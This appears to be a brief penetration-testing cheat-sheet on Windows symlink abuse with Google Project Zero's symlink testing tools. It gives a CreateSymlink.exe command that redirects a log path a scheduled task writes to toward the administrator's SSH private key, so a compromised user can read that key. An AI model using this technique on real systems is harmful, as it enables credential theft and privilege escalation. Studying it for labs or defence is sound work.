# Symlinks

Link: https://github.com/googleprojectzero/symboliclink-testing-tools/releases/tag/v1.0

Extract with

    7z e Release.7z

## Requirements

A task exists that our compromised user has write access to a specific directory that the task accesses.

FIRST, DO NOT FORGET TO DELETE THE CONTENTS OF THE TARGET YOU WANT TO SYMLINK!

### 1) CreateSymlink

Extract a sensitive file, e.g., an SSH private key.

    .\CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\users\administrator\.ssh\id_rsa"

Wait for the scheduled task to run for a few minutes, then press Enter to revert.

Now, you can access the sensitive file.
